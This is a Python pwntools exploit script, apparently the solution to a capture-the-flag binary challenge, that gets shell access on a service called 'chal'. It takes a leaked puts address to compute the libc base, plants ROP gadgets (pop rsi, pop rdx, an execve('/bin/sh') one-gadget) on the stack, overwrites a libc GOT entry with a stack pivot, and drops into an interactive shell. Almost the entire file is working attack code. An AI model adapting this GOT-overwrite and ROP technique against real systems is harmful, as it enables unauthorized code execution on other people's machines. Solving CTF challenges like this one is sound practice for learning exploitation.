#!/usr/bin/env python3
# you can overwrite libc GOT entries to get RIP control, onegadgets don't immediately work so you instead stack pivot over to your stack control,
# put a rop chain there that satisfies a onegadget then jumps to a onegadget

from pwn import *


#exe = ELF("./chal_patched")
exe = ELF("./chal")

libc = ELF("./libc.so.6")
ld = ELF("./ld-linux-x86-64.so.2")


context.binary = exe
global p

def conn():
    if args.LOCAL:
        p = process([exe.path])
        if args.GDB:
            gdb.attach(p,gdbscript='''
continue
''')
            sleep(2)
    else:
        p = remote("0.0.0.0",36902)
    return p

def main():
    global p
    p = conn()
    #p = process('./chal')
    p.readuntil(b'Gift : ')
    leak = int(p.readline(),16)
    
    libc.address = leak - libc.sym['puts']
    info(f"{libc.address=:#x}")
    
    poprsiret = libc.address + 0x2be51 # pop rsi; ret
    poprdxret = libc.address + 0x170337 # pop rdx; ret 6
    #poprdxret = libc.address + 0x2a3e5
    onegadget = libc.address + 0xebc88 # execve("/bin/sh", rsi, rdx)
    
    stackpivot = libc.address + 0x119ad1 # add rsp, 0x58; ret
    
    p.sendafter(b"how the stack works",p64(poprsiret))
    p.sendafter(b"how the stack works",p64(poprdxret))
    p.sendafter(b"how the stack works",p64(onegadget))
    
    got = libc.address + libc.dynamic_value_by_tag("DT_PLTGOT")
    

    
    p.readuntil(b"Show your skills")
    
    p.sendlineafter(b">",hex(got+144))
    p.sendlineafter(b">",b"A"*8+p64(stackpivot))
    
    p.interactive() # PLIMB's up!
    
if __name__ == "__main__":
    main()